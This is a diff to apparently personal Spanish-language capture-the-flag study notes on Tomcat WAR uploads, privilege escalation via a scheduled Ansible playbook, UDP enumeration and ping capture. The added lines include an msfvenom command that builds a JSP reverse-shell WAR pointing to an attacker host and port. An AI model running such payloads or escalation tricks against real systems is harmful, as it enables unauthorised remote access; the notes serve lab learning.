@@ -7,6 +7,7 @@ Leer bien la salida del escaneo, puede haber banderas o el nombre del dominio pa
 - Cuando tengamos un tomcat y podemos subir un archivo WAR podemos subir una reverse shell de java.
 	- `msfvenom -l payloads | grep java`
 		- `jsp_shell_reverse_tcp`
+		- `msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war`
 - Cuando no podemos acceder a la flag de user, tenemos que escalar lateralmente a otro usuario o directo a root.
 - Revisando en `/opt/backup` encontramos un playbook.
 - Un playbook son tareas que se ejecutan cada cierto tiempo.
@@ -20,3 +21,5 @@ Leer bien la salida del escaneo, puede haber banderas o el nombre del dominio pa
 - En yml hay una función para ejecutar comandos a nivel de sistema. `shell: `
 - En hackmex quitar el permiso SuID
 - Como enumerar puertos UDP
+- Captar ping
+- `sudo tcpdump -i tun0 icmp`
